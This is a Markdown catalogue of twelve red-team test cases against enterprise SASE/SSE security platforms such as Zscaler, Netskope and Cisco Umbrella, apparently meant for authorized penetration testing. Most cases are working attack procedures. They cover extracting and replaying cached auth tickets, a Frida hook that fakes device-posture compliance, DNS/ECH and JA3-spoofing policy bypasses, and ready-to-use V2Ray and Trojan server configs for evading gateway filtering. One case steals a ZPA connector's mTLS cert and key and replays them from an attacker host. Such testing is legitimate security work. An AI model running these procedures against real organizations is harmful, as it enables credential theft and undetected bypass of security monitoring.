# SASE / SSE Platform Attack Test Cases

> Companion to `SKILL.md`, containing structured test cases organized by category with severity ratings.
> All commands assume an authorized engagement scope, a lab SSE tenant (Zscaler Beta / Netskope Sandbox / a lab Prisma Access / a personal Cloudflare One account / a Microsoft 365 Developer tenant with GSA), or a clone of the production tenant. Never run active exploitation against production without explicit written authorization.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. SSE Vendor Recon & Fingerprint | 2 | LOW - MEDIUM |
| B. Client Connector Reverse Engineering | 2 | HIGH - CRITICAL |
| C. TLS Inspection Bypass | 2 | MEDIUM - HIGH |
| D. Policy & Routing Bypass | 3 | HIGH - CRITICAL |
| E. Anonymizer Evasion & Data Exfiltration | 2 | HIGH - CRITICAL |
| F. Admin API & App Connector Compromise | 1 | CRITICAL |
| **Total** | **12** | **LOW - CRITICAL** |

---

## A. SSE Vendor Recon & Fingerprint

### TC-SS-001: SSE Vendor Fingerprinting from Endpoint

| Field | Value |
|------|-----|
| **ID** | TC-SS-001 |
| **Name** | SSE Vendor Fingerprinting from Endpoint (macOS / Windows / Linux) |
| **Severity** | LOW |
| **Category** | Vendor Recon |
| **Objective** | Identify which SASE/SSE vendor (Zscaler, Netskope, Palo Alto, Cisco, CATO, Cloudflare, Microsoft GSA) is deployed on an endpoint without privileged access. |
| **Prerequisites** | Local user access on a managed endpoint or BYOD device. No admin required for read-only inspection. |
| **Tools** | security (macOS), certutil (Windows), openssl, ps, ifconfig, scutil, curl |
| **Steps** | 1. Inspect the system trust store for an SSE-installed root cert:<br>macOS: `security find-certificate -a -c 'Zscaler\|Netskope\|Palo Alto\|Cisco\|CATO\|Cloudflare\|Microsoft' /Library/Keychains/System.keychain`<br>Windows: `certutil -store Root \| findstr /I 'Zscaler Netskope Palo Cisco CATO Cloudflare'`<br>2. List running agent processes: `ps -axo pid,comm \| grep -iE 'zsagent\|nspa\|pangpa\|umbrella\|cato\|warp\|gsa'` (macOS/Linux) or `Get-Process \| Where-Object {$_.ProcessName -match 'Zscaler\|Netskope\|PanGPA\|Umbrella\|CATO\|WARP\|GSA'}` (Windows).<br>3. Inspect routing table for the agent's TUN/utun: `ifconfig \| grep -E 'utun\|tun\|cato\|warp\|tunnel'` and `netstat -rn \| grep -E 'utun\|tun'`.<br>4. Identify the enforced DNS resolver: `scutil --dns \| grep 'nameserver\[0\]'` (macOS) or `Get-DnsClientServerAddress` (Windows).<br>5. Fingerprint the HTTPS interception issuer: `echo Q \| openssl s_client -showcerts -connect www.example.com:443 2>/dev/null \| openssl x509 -noout -issuer -subject`. Issuer like "Zscaler Root CA", "Netskope MMD Root CA", "GlobalProtect", "Cisco Umbrella Root CA", "CATO Root CA", "Cloudflare Root CA", or "Microsoft Global Secure Access Root" identifies the vendor. |
| **Expected Result** | Vendor identification across 5 dimensions (root cert, process, interface, DNS, HTTPS issuer). Cross-correlation gives high-confidence vendor identification even when only one dimension succeeds. |
| **False Positive Risk** | LOW — five cross-correlated signals. Note: managed endpoint with no agent visible (no root cert, no process) may indicate the SSE is deployed at the network edge (site-to-site SSE) rather than the endpoint. |
| **Cleanup** | None (read-only). |
| **References** | payloads.md §1 (vendor fingerprinting); SKILL.md Exercise 1 |

### TC-SS-002: SSE Tenant & Admin Surface Enumeration (Authorized)

| Field | Value |
|------|-----|
| **ID** | TC-SS-002 |
| **Name** | SSE Tenant and Admin Surface Enumeration (Authorized) |
| **Severity** | MEDIUM |
| **Category** | Vendor Recon |
| **Objective** | Enumerate the SSE tenant (cloud instance name, customer ID, admin portal URL) and identify the admin API surface, conditional on engagement scope. |
| **Prerequisites** | Authorized engagement scope that covers admin portal reconnaissance. A low-priv user account (any user) is sufficient to extract the tenant name from the agent's auth flow. |
| **Tools** | Wireshark/tshark, curl, mitmproxy (with the SSE root), vendor-specific API tools |
| **Steps** | 1. Capture the agent's auth flow with Wireshark (with SSE root installed in Wireshark): `tshark -i en0 -Y 'tls.handshake.extensions_server_name contains "zscaler\|goskope\|prismaaccess\|opendns\|cato-networks\|cloudflareaccess\|globalsecureaccess"' -T fields -e tls.handshake.extensions_server_name`. The SNI reveals the tenant subdomain (e.g., `acme.gateway.zscaler.net` → tenant "acme").<br>2. Enumerate the admin portal URLs for each identified vendor:<br>   - Zscaler ZIA: `https://admin.<cloud>.net` (cloud = zscalerone / zscalertwo / zscalerbeta / zscalercloud / zscalegov)<br>   - Zscaler ZPA: `https://admin.private.zscaler.com`<br>   - Netskope: `https://<tenant>.goskope.com`<br>   - Palo Alto Prisma Access: `https://apps.paloaltonetworks.com`<br>   - Cisco Umbrella: `https://dashboard.umbrella.com`<br>   - CATO Networks: `https://cato-management.sdp.catonetworks.com`<br>   - Cloudflare One: `https://dash.cloudflare.com`<br>   - Microsoft GSA: `https://entra.microsoft.com` (Network Access blade)<br>3. Test the admin API endpoint with a low-priv user token to confirm the API surface exists (most will return 403 to low-priv; the 404 vs 403 confirms endpoint existence).<br>4. Cross-correlate tenant name with DNS: `dig +short CNAME acme.gateway.zscaler.net` reveals the actual cloud instance backend. |
| **Expected Result** | Tenant name, cloud instance, admin portal URL, and admin API surface for the deployed SSE vendor(s). Identifies which admin APIs (Zscaler ZIA, ZPA, Netskope v2, Cloudflare Access, Microsoft Graph GSA) are in scope for subsequent tests. |
| **False Positive Risk** | LOW — multiple corroborating signals. |
| **Cleanup** | None (read-only enumeration). |
| **References** | payloads.md §2 (admin tenant enumeration); SKILL.md Core Tools |

---

## B. Client Connector Reverse Engineering

### TC-SS-003: Zscaler Client Connector Token Cache Extraction

| Field | Value |
|------|-----|
| **ID** | TC-SS-003 |
| **Name** | Zscaler Client Connector Token Cache Extraction and Ticket Replay |
| **Severity** | HIGH |
| **Category** | Client Connector Reverse Engineering |
| **Objective** | Demonstrate that an attacker with local user access can extract the Zscaler Client Connector's cached auth ticket and replay it to authenticate to the ZIA cloud as the user. |
| **Prerequisites** | Authorized lab device running Zscaler Client Connector with an active user session. Local user (not necessarily admin) on macOS / Windows / Linux. |
| **Tools** | find, cat, base64, curl |
| **Steps** | 1. Locate the Zscaler Client Connector cache directories:<br>macOS: `sudo find ~/Library/Application\ Support/Zscaler /Library/Application\ Support/Zscaler -type f 2>/dev/null`<br>Windows: `dir /S %APPDATA%\Zscaler %PROGRAMDATA%\Zscaler`<br>Linux: `sudo find /opt/zscaler /home/*/.config/Zscaler -type f 2>/dev/null`<br>2. Inspect the auth ticket files (paths vary by version):<br>`~/Library/Application Support/Zscaler/ZscalerClientConnector/obkey` (the obfuscated Zscaler Ticket)<br>`~/Library/Application Support/Zscaler/ZscalerClientConnector/zsatoken`<br>`/Library/Application Support/Zscaler/Zscaler/.zscalerinfo` (tenant info)<br>3. Decode the obkey: `cat obkey \| base64 -d 2>/dev/null \| head -c 200`. If the result contains a tenant name + JWT-like structure, the ticket is recoverable.<br>4. Read the tenant info: `cat /Library/Application\ Support/Zscaler/Zscaler/.zscalerinfo \| jq . 2>/dev/null \| grep -i 'cloud\|customer_id\|username'`.<br>5. Replay the ticket to authenticate (authorized lab):<br>`curl -s -H "Content-Type: application/json" "https://<ZIA_CLOUD>/api/v1/auth?ticket=$ZSCALER_TICKET&username=$USERNAME" \| jq .`<br>If the response contains `jsessionid` and a `Set-Cookie` header, replay is successful. |
| **Expected Result** | Cached Zscaler Ticket extracted, decoded, and replayed to the ZIA cloud; receives an authenticated session cookie valid for the user. |
| **False Positive Risk** | LOW — a valid `jsessionid` from replay confirms. |
| **Cleanup** | The user signs out and back in to invalidate the ticket. Admin rotates the user's session via the ZIA admin console. |
| **References** | payloads.md §3 (Zscaler Client Connector reverse engineering); SKILL.md Exercise 2 |

### TC-SS-004: Frida-Based Posture Hook on SSE Agent (Authorized Lab)

| Field | Value |
|------|-----|
| **ID** | TC-SS-004 |
| **Name** | Frida Posture Hook on SSE Agent (Generic Pattern, Zscaler / Netskope) |
| **Severity** | CRITICAL |
| **Category** | Client Connector Reverse Engineering |
| **Objective** | Demonstrate that the agent's posture reporter can be hooked at runtime to always return "compliant", bypassing posture-based access policies. |
| **Prerequisites** | Authorized lab; SIP disabled on macOS (`csrutil disable` in recovery); local admin; agent version with no anti-Frida (or with anti-Frida bypassed). |
| **Tools** | Frida, frida-trace, Hopper/Ghidra (for function discovery) |
| **Steps** | 1. Discover the posture-related functions in the agent binary using frida-trace: `frida-trace -i '*[Pp]osture*' -n ZscalerClientConnector` (or equivalent for the target agent). Note the matched function names.<br>2. Verify the function's role by setting a breakpoint and inspecting arguments / return value: `frida-trace -i '_ZN20ZscalerClientConnector13getPostureEv' -n ZscalerClientConnector`.<br>3. Write a Frida hook that replaces the function with a callback returning "compliant":<br>```javascript<br>const postureFunc = Module.findExportByName(null, 'getPostureState');<br>Interceptor.replace(postureFunc, new NativeCallback(() => {<br>  console.log('[+] Posture hook fired');<br>  return 1; // match the agent's "compliant" return value<br>}, 'int', []));<br>```<br>4. Spawn the agent with Frida and the hook: `frida -f /Applications/Zscaler/ZscalerClientConnector.app/Contents/MacOS/ZscalerClientConnector -l /tmp/bypass-posture.js --no-pause`.<br>5. Trigger a posture re-evaluation (typically by signing out and back in to the agent) and verify the agent reports "compliant" regardless of actual device state.<br>6. From a non-compliant state (e.g., disable disk encryption, stop EDR), verify the agent still reports compliant and the SSE allows access. |
| **Expected Result** | Agent reports "compliant" regardless of actual device posture; SSE cloud allows access to posture-gated apps. |
| **False Positive Risk** | LOW — the SSE cloud's access log shows "compliant device" while the device is non-compliant. |
| **Cleanup** | Stop Frida, restart the agent, re-enable EDR/disk encryption. |
| **References** | payloads.md §3 (Frida posture hook); SKILL.md Exercise 3; Frida documentation |

---

## C. TLS Inspection Bypass

### TC-SS-005: TLS Inspection Bypass via Encrypted Client Hello (ECH)

| Field | Value |
|------|-----|
| **ID** | TC-SS-005 |
| **Name** | TLS Inspection Bypass via Encrypted Client Hello (ECH) |
| **Severity** | MEDIUM |
| **Category** | TLS Inspection Bypass |
| **Objective** | Demonstrate that a client enforcing ECH prevents the SSE SWG from reading the inner SNI, defeating domain-based policy. |
| **Prerequisites** | Lab SSE tenant with domain-based policy that blocks a known category (e.g., gambling). Firefox ≥ 90 or Chromium ≥ 116 with ECH support. |
| **Tools** | Firefox / Chromium, Wireshark/tshark |
| **Steps** | 1. Configure Firefox to enforce ECH:<br>In `about:config`:<br>- `network.dns.echconfig.enabled` = `true`<br>- `network.dns.use_https_rr_as_altsvc` = `true`<br>- `network.trr.uri` = `https://cloudflare-dns.com/dns-query`<br>- `network.trr.mode` = `3` (TRR-only)<br>2. Restart Firefox and verify ECH is in use at `https://tls-ech.dev/`. The page should report "Encrypted ClientHello: Yes".<br>3. Capture the TLS handshake with tshark: `tshark -i en0 -Y 'tls.handshake.type == 1' -V -o 'tls.keys_list:' 2>&1 \| grep -i 'encrypted_server_name\|ECH'`.<br>4. Verify the SSE SWG cannot classify the flow: visit a domain in a blocked category (e.g., `gambling.example.com` if the SSE blocks gambling). With ECH enforced, the SWG cannot read the inner SNI; the flow is classified only by the outer SNI (typically a CDN like `cloudflare-dns.com` or `*.cloudfront.net`).<br>5. Compare with ECH disabled: same domain without ECH is blocked; with ECH is allowed. |
| **Expected Result** | Either (a) the SSE blocks ECH entirely at the network edge (informational — the SSE is hardened) or (b) ECH-capable clients bypass domain-based policy (MEDIUM — policy bypass demonstrated). |
| **False Positive Risk** | MEDIUM — some sites legitimately fail with ECH; verify with multiple test domains. |
| **Cleanup** | Restore Firefox ECH settings to defaults. |
| **References** | payloads.md §5 (TLS inspection bypass); Mozilla ECH wiki; RFC 9460 |

### TC-SS-006: DoH/DoT Bypass of SSE-Enforced DNS

| Field | Value |
|------|-----|
| **ID** | TC-SS-006 |
| **Name** | DoH/DoT Bypass of SSE-Enforced DNS Resolver |
| **Severity** | HIGH |
| **Category** | TLS Inspection Bypass |
| **Objective** | Demonstrate that DoH/DoT to an outside resolver bypasses the SSE-enforced corporate DNS, defeating DNS-based policy. |
| **Prerequisites** | Lab SSE tenant with DNS-based policy. Local user access. |
| **Tools** | Firefox / Chromium, dnscrypt-proxy, stubby, curl |
| **Steps** | 1. Configure Firefox to use DoH to an outside resolver (e.g., `https://dns.google/dns-query` or `https://doh.opendns.com/dns-query`):<br>In `about:config`:<br>- `network.trr.uri` = `https://dns.google/dns-query`<br>- `network.trr.mode` = `3`<br>2. Alternative: deploy dnscrypt-proxy locally:<br>`brew install dnscrypt-proxy` (macOS) / `apt install dnscrypt-proxy` (Linux)<br>Edit `/opt/homebrew/etc/dnscrypt-proxy.toml`:<br>`server_names = ['google', 'cloudflare']`<br>`listen_addresses = ['127.0.0.1:5300']`<br>`doh_servers = true`<br>3. Start dnscrypt-proxy and set the system DNS to 127.0.0.1 (BYOD) or rely on Firefox-only DoH (managed).<br>4. Verify DNS is no longer going through the SSE: `dig +trace blocked-by-dns.example.com`. The trace should show hops through Google/Cloudflare, not the corporate resolver.<br>5. Visit the blocked domain via Firefox. If DNS policy was the enforcement mechanism, the domain now resolves to the real IP and the HTTPS flow follows. |
| **Expected Result** | Either (a) the SSE blocks DoH/DoT to outside resolvers at the network edge (informational — hardened) or (b) DNS-based policy is bypassed via DoH (HIGH — bypass confirmed). |
| **False Positive Risk** | LOW — DNS trace is definitive. |
| **Cleanup** | Restore system DNS settings; revert Firefox DoH config. |
| **References** | payloads.md §5 (DoH/DoT bypass); SKILL.md Exercise 5; RFC 8484 |

---

## D. Policy & Routing Bypass

### TC-SS-007: Zscaler ZIA-FWD-ZPA Split-Tunnel Race Condition

| Field | Value |
|------|-----|
| **ID** | TC-SS-007 |
| **Name** | Zscaler ZIA-FWD-ZPA Split-Tunnel Race Condition |
| **Severity** | HIGH |
| **Category** | Policy & Routing Bypass |
| **Objective** | Demonstrate that a process can win the classification race during agent startup and bypass the Zscaler ZIA forward proxy for the lifetime of the connection. |
| **Prerequisites** | Authorized lab macOS / Linux device with Zscaler Client Connector and the ZIA-FWD-ZPA pattern. Local admin. |
| **Tools** | launchctl (macOS) / systemctl (Linux), curl |
| **Steps** | 1. Identify the agent's launch daemon: `sudo launchctl list \| grep -i zscaler` (macOS) or `sudo systemctl status zscaler-connector` (Linux). Note the daemon plist path.<br>2. Identify a target destination that the ZIA policy blocks (e.g., a known-bad category site).<br>3. Stop the agent daemon: `sudo launchctl unload /Library/LaunchDaemons/com.zscaler.agentdaemon.plist`.<br>4. Open a long-lived HTTPS connection to the target immediately: `nohup curl --keepalive-time 60 -o /dev/null https://blocked.example.com &`.<br>5. Restart the agent daemon: `sudo launchctl load /Library/LaunchDaemons/com.zscaler.agentdaemon.plist`.<br>6. Observe: if the curl process is still running and receiving data after the agent restarts, the socket was classified before the agent's WFP/NetworkExtension filter re-installed — bypassed.<br>7. Verify with tcpdump: `sudo tcpdump -i en0 -w bypass.pcap host blocked.example.com and port 443` — if packets flow without an associated Zscaler tunnel (utun) encapsulation, bypass is confirmed. |
| **Expected Result** | Either (a) the connection is terminated on agent restart (informational — the agent's filter is sticky) or (b) the connection persists through the agent restart window and traffic flows direct (HIGH — bypass). |
| **False Positive Risk** | MEDIUM — timing-dependent; repeat 5-10 times to confirm reproducibility. |
| **Cleanup** | Terminate the curl process; restart the agent cleanly. |
| **References** | payloads.md §6 (split-tunnel race); SKILL.md Exercise 7 |

### TC-SS-008: JA3/JA4 Spoofing against Netskope MACE

| Field | Value |
|------|-----|
| **ID** | TC-SS-008 |
| **Name** | JA3/JA4 TLS Fingerprint Spoofing against Netskope MACE |
| **Severity** | HIGH |
| **Category** | Policy & Routing Bypass |
| **Objective** | Demonstrate that an attacker can spoof the JA3/JA4 TLS client fingerprint to match a known-trusted client (Chrome) and bypass Netskope MACE classification that blocks unknown clients. |
| **Prerequisites** | Lab Netskope tenant with MACE classification enabled. Linux or macOS with curl-impersonate or Python tls-client. |
| **Tools** | curl-impersonate, tls-client (Python), ja3 / ja4 tools |
| **Steps** | 1. Capture the JA3 fingerprint of a known-trusted client (clean Chrome installation):<br>`pip install ja3`<br>`python3 -m ja3 --host www.example.com --port 443` — note the JA3 hash.<br>2. Verify the baseline: with vanilla curl, attempt a flow that MACE blocks:<br>`curl -o /dev/null -w '%{http_code}\n' https://blocked-by-mace.example.com/` — likely 403 or blocked.<br>3. Install curl-impersonate (chrome variant):<br>`brew install curl-impersonate` (macOS) / build from source (Linux)<br>4. Repeat with curl-impersonate-chrome: `curl_chrome116 https://blocked-by-mace.example.com/ -o /dev/null -w '%{http_code}\n'`. If 200, MACE classification was bypassed.<br>5. Confirm with Python tls-client:<br>`pip install tls-client`<br>`python3 -c "import tls_client; s = tls_client.Session(client_identifier='chrome_120'); print(s.get('https://blocked-by-mace.example.com/').status_code)"`<br>6. Capture the spoofed TLS handshake with tshark: `tshark -i en0 -Y 'tls.handshake.type == 1' -T fields -e tls.handshake.extensions_server_name -e ip.dst 2>&1 \| head`. Verify the JA3 in the packet matches Chrome's. |
| **Expected Result** | Either (a) MACE classifies on additional signals beyond JA3 (HTTP/2 fingerprint, headers) and blocks (informational) or (b) JA3 spoofing is sufficient and the flow passes (HIGH — bypass). |
| **False Positive Risk** | LOW — 200 vs 403 is definitive. |
| **Cleanup** | None (single request). |
| **References** | payloads.md §4 (MACE evasion); SKILL.md Exercise 6; JA3/JA4 documentation |

### TC-SS-009: Cisco Umbrella Roaming Client Bypass

| Field | Value |
|------|-----|
| **ID** | TC-SS-009 |
| **Name** | Cisco Umbrella Roaming Client Bypass via DoH and SmartProxy Block-Page Bypass |
| **Severity** | HIGH |
| **Category** | Policy & Routing Bypass |
| **Objective** | Demonstrate that an attacker can bypass the Cisco Umbrella roaming client via DoH to an outside resolver, and via SmartProxy block-page bypass using direct IP connection. |
| **Prerequisites** | Lab Windows / macOS / Linux device with Cisco Umbrella roaming client installed. Local user. |
| **Tools** | Firefox, curl, dig, dnscrypt-proxy |
| **Steps** | 1. Verify the roaming client is enforcing DNS: `scutil --dns \| grep 'nameserver\[0\]'` (macOS) — the resolver should be 127.0.0.1 or the Umbrella resolver IP.<br>2. Attempt to visit a blocked domain via vanilla DNS: `curl https://blocked.example.com/` — should be redirected to the Umbrella block page.<br>3. **DoH bypass**: Configure Firefox `network.trr.uri = https://dns.google/dns-query`, `network.trr.mode = 3`. Visit the blocked domain. If DNS policy is the enforcement, the domain now resolves to the real IP.<br>4. **SmartProxy block-page bypass**: Resolve the domain's real IP via DoH (e.g., `curl -H 'accept: application/dns-json' 'https://dns.google/resolve?name=blocked.example.com&type=A' \| jq .Answer[].data`). Then connect directly to the IP without DNS: `curl --resolve blocked.example.com:443:<real_ip> https://blocked.example.com/`. If the block page was enforced at DNS only (not SNI inspection), the direct connection succeeds.<br>5. (Optional, requires admin) **Agent stop bypass**: `sudo launchctl unload /Library/LaunchDaemons/com.cisco.umbrella.roamingclient.plist` (macOS) or `sudo systemctl stop openvpn-umbrella` (Linux). DNS now uses the system resolver; if MDM is not enforcing, the agent stays stopped. |
| **Expected Result** | Either (a) Umbrella enforces via SNI inspection and the bypass fails (informational — hardened) or (b) DNS-only enforcement allows DoH bypass or direct-IP bypass (HIGH). |
| **False Positive Risk** | LOW — 200 vs block page is definitive. |
| **Cleanup** | Restore DNS settings; restart the roaming client if stopped. |
| **References** | payloads.md §7 (Cisco Umbrella bypass); SKILL.md Exercise 9 |

---

## E. Anonymizer Evasion & Data Exfiltration

### TC-SS-010: V2Ray (vmess+WS+TLS) Anonymizer Evasion

| Field | Value |
|------|-----|
| **ID** | TC-SS-010 |
| **Name** | V2Ray (vmess+WebSocket+TLS) Anonymizer Evasion against SWG |
| **Severity** | CRITICAL |
| **Category** | Anonymizer Evasion |
| **Objective** | Demonstrate that a V2Ray server deployed behind a residential IP with vmess+WS+TLS presents a TLS profile indistinguishable from legitimate HTTPS, defeating SWG classification. |
| **Prerequisites** | Authorized lab with attacker-controlled VPS on a residential IP (or cloud IP not yet blocklisted). SSE-protected endpoint with local user. Valid TLS cert for the VPS domain (Let's Encrypt). |
| **Tools** | Xray-core / v2ray-core, curl, openssl |
| **Steps** | 1. Deploy the V2Ray server on the VPS (authorized lab):<br>Install Xray-core: `bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install`<br>2. Configure the server at `/usr/local/etc/xray/config.json`:<br>```json<br>{<br>  "inbounds": [{<br>    "port": 443,<br>    "protocol": "vmess",<br>    "settings": {"clients": [{"id": "REPLACE_WITH_YOUR_UUID", "alterId": 0}]},<br>    "streamSettings": {<br>      "network": "ws", "security": "tls",<br>      "tlsSettings": {"certificates": [{"certificateFile": "/etc/letsencrypt/live/REPLACE_WITH_YOUR_DOMAIN/fullchain.pem", "keyFile": "/etc/letsencrypt/live/REPLACE_WITH_YOUR_DOMAIN/privkey.pem"}]},<br>      "wsSettings": {"path": "/REPLACE_WITH_YOUR_PATH"}<br>    }<br>  }],<br>  "outbounds": [{"protocol": "freedom"}]<br>}<br>```<br>3. Restart Xray: `systemctl restart xray`.<br>4. Configure the V2Ray client on the SSE-protected endpoint (local socks proxy at 127.0.0.1:1080).<br>5. Use the local socks proxy: `curl --socks5 127.0.0.1:1080 https://ifconfig.me` — the response should show the residential IP, not the SSE egress.<br>6. Verify the SWG classification: visit a domain in a blocked category via the socks proxy. If the SWG cannot classify the flow, the request succeeds.<br>7. Verify the TLS profile: `openssl s_client -connect REPLACE_WITH_YOUR_DOMAIN:443 -servername REPLACE_WITH_YOUR_DOMAIN` — the cert chain should be the legitimate Let's Encrypt cert, indistinguishable from a normal HTTPS site. |
| **Expected Result** | The V2Ray flow appears as legitimate HTTPS to REPLACE_WITH_YOUR_DOMAIN; SWG cannot classify it as anonymizer; the local socks proxy provides unrestricted egress via the residential IP. |
| **False Positive Risk** | LOW — `ifconfig.me` returning the residential IP confirms. |
| **Cleanup** | Stop the V2Ray client; tear down the server post-engagement. |
| **References** | payloads.md §9 (anonymizer evasion); SKILL.md Exercise 8; Xray-core documentation |

### TC-SS-011: Trojan HTTPS-Look Proxy Evasion

| Field | Value |
|------|-----|
| **ID** | TC-SS-011 |
| **Name** | Trojan HTTPS-Look Proxy Evasion with Real Website Frontend |
| **Severity** | HIGH |
| **Category** | Anonymizer Evasion |
| **Objective** | Demonstrate that a Trojan proxy (which serves a real website on probe) presents an HTTPS profile indistinguishable from a legitimate CDN-fronted site, defeating SWG probing. |
| **Prerequisites** | Authorized lab VPS with Trojan server installed and a real website (e.g., nginx serving a static site) on the same domain. Valid TLS cert. |
| **Tools** | trojan-go / trojan, nginx, curl |
| **Steps** | 1. Configure nginx to serve a real website on the VPS (e.g., a static landing page on port 80; Trojan will share 443).<br>2. Configure the Trojan server to share port 443 with nginx. Trojan forwards non-proxy TLS connections to nginx; proxy connections are forwarded to the freedom outbound. Config at `/etc/trojan/config.json`:<br>```json<br>{<br>  "run_type": "server",<br>  "local_addr": "0.0.0.0", "local_port": 443,<br>  "remote_addr": "127.0.0.1", "remote_port": 80,<br>  "password": ["REPLACE_WITH_YOUR_PASSWORD"],<br>  "ssl": {"cert": "/etc/letsencrypt/live/REPLACE_WITH_YOUR_DOMAIN/fullchain.pem", "key": "/etc/letsencrypt/live/REPLACE_WITH_YOUR_DOMAIN/privkey.pem", "sni": "REPLACE_WITH_YOUR_DOMAIN"}<br>}<br>```<br>3. Restart Trojan: `systemctl restart trojan`.<br>4. From the SSE-protected endpoint, verify a probe looks like the real website: `curl https://REPLACE_WITH_YOUR_DOMAIN/` — returns the nginx landing page.<br>5. Configure the Trojan client locally (socks proxy at 127.0.0.1:1080) and use it: `curl --socks5 127.0.0.1:1080 https://ifconfig.me` — returns the VPS IP.<br>6. Verify the SWG cannot classify: even if the SWG probes the domain, it sees a real website, not a proxy. The TLS fingerprint is nginx's, not a proxy client's. |
| **Expected Result** | Trojan flow indistinguishable from legitimate HTTPS to REPLACE_WITH_YOUR_DOMAIN; SWG probe returns the real website; egress via the Trojan socks proxy is unrestricted. |
| **False Positive Risk** | LOW — distinct IP from ifconfig.me. |
| **Cleanup** | Stop the Trojan client; tear down the server post-engagement. |
| **References** | payloads.md §9 (Trojan evasion); Trojan documentation |

---

## F. Admin API & App Connector Compromise

### TC-SS-012: Zscaler ZPA App Connector mTLS Cert Compromise

| Field | Value |
|------|-----|
| **ID** | TC-SS-012 |
| **Name** | Zscaler ZPA App Connector mTLS Cert Compromise and Cloud Replay |
| **Severity** | CRITICAL |
| **Category** | Admin API & App Connector Compromise |
| **Objective** | Demonstrate that an attacker with access to a host running a ZPA App Connector can extract the mTLS cert + provisioning key and replay them from an attacker-controlled host to authenticate as the App Connector to the Zscaler cloud, gaining access to every internal app the connector publishes. |
| **Prerequisites** | Authorized lab with a compromised internal host running a Zscaler ZPA App Connector. Local root on the connector host. |
| **Tools** | find, openssl, scp, curl |
| **Steps** | 1. Locate the App Connector's mTLS cert + provisioning key:<br>`sudo find /opt/zscaler /etc/zscaler /var/lib/zscaler -type f 2>/dev/null`<br>Common paths: `/opt/zscaler/app_connector.crt`, `/opt/zscaler/app_connector.key`, `/opt/zscaler/provisioning.key`, `/opt/zscaler/service-edge.pem`<br>2. Inspect the mTLS cert: `sudo openssl x509 -in /opt/zscaler/app_connector.crt -noout -subject -issuer -dates`. Note the subject CN (typically the connector ID) and the issuer (Zscaler Private Access Root CA).<br>3. Copy the cert + key to the attacker-controlled host:<br>`scp compromised:/opt/zscaler/app_connector.crt ./stolen.crt`<br>`scp compromised:/opt/zscaler/app_connector.key ./stolen.key`<br>4. Identify the ZPA customer ID (typically in `/opt/zscaler/.zpa_info` or in the connector's local log): `sudo cat /opt/zscaler/.zpa_info \| jq .customer_id`.<br>5. Replay the cert to authenticate to the Zscaler ZPA cloud API:<br>`curl -s --cert ./stolen.crt --key ./stolen.key -H "X-Zscaler-Customer-Id: REPLACE_WITH_YOUR_CUSTOMER_ID" "https://config.private.zscaler.com/api/v1/appConnectors"` — returns the connector's config.<br>6. Enumerate which internal apps the connector publishes:<br>`curl -s --cert ./stolen.crt --key ./stolen.key -H "X-Zscaler-Customer-Id: REPLACE_WITH_YOUR_CUSTOMER_ID" "https://config.private.zscaler.com/api/v1/segmentGroups"` — returns the segment groups the connector serves.<br>7. Route through the stolen connector to an internal app (the exact mechanism depends on ZPA's broker; the cert grants the connector's view of internal apps). |
| **Expected Result** | Stolen App Connector cert + key replayed from attacker host; ZPA cloud returns the connector's config and the segment groups it serves. Attacker can route to internal apps the connector publishes. |
| **False Positive Risk** | LOW — successful API calls with the stolen cert are definitive. |
| **Cleanup** | Revoke the App Connector's cert via the ZPA admin console (rotate the connector). Treat the cert as a long-lived credential; the defender must rotate. |
| **References** | payloads.md §10 (App Connector compromise); SKILL.md Exercise 10; Mandiant Zscaler App Connector research (2024) |

---

## Appendix: Severity Calibration

| Severity | Definition | Example |
|----------|------------|---------|
| **LOW** | Reconnaissance / fingerprinting. No impact alone. | TC-SS-001 (vendor fingerprint) |
| **MEDIUM** | Authenticated enumeration or protocol-level bypass that may be mitigated. | TC-SS-002 (tenant enum), TC-SS-005 (ECH bypass — depends on SSE configuration) |
| **HIGH** | Confirmed bypass or credential theft granting unauthorized access. | TC-SS-003 (token cache extraction), TC-SS-004 (Frida posture hook), TC-SS-006 (DoH bypass), TC-SS-007 (split-tunnel race), TC-SS-008 (JA3 spoof), TC-SS-009 (Umbrella bypass), TC-SS-011 (Trojan evasion) |
| **CRITICAL** | Full anonymity-exfiltration channel or App Connector compromise. | TC-SS-010 (V2Ray evasion), TC-SS-012 (App Connector cert compromise) |

## Appendix: Test Tenant Setup

For reproducible testing, set up isolated test tenants for each vendor:

- **Zscaler**: Free trial at [zscaler.com](https://www.zscaler.com/free-trials). Zscaler Beta (`zscalerbeta.net`) for development tenants.
- **Netskope**: Free trial / sandbox tenant via your Netskope SE; alternatively Netskope Cloud Exchange Community Edition for lab.
- **Palo Alto Prisma Access**: 30-day trial via Palo Alto sales; alternatively set up a lab Prisma Access instance with a single remote network.
- **Cisco Umbrella**: 14-day free trial at [signup.umbrella.com](https://signup.umbrella.com).
- **CATO Networks**: 30-day PoC via CATO SE.
- **Cloudflare One**: Free tier in any Cloudflare account — enable Zero Trust, deploy WARP on a test device.
- **Microsoft Entra Global Secure Access**: Requires Microsoft Entra ID P1 license; available with Microsoft 365 E5 / Developer Program tenant.

Run all destructive tests (TC-SS-003 through TC-SS-012) in these test tenants, never in production.

## Appendix: Legal & Scope Notes

- All bypass tests assume **authorized engagement scope**. Bypassing an enterprise SSE without authorization may violate corporate policy, employment agreements, and local laws (e.g., Computer Fraud and Abuse Act in the US, Computer Misuse Act in the UK).
- **Anonymizer deployment** (TC-SS-010, TC-SS-011) on a residential IP you do not own may violate the ISP's terms. Use your own infrastructure or authorized cloud.
- **Frida instrumentation** (TC-SS-004) on production agents may trip EDR alerts. Confirm the engagement scope covers EDR evasion.
- **App Connector cert theft** (TC-SS-012) leaves a long-lived credential compromised; the defender must rotate post-engagement. Document this in the report's remediation section.
- **Token cache extraction** (TC-SS-003) leaves the user's session exposed until ticket rotation; document the cleanup window.
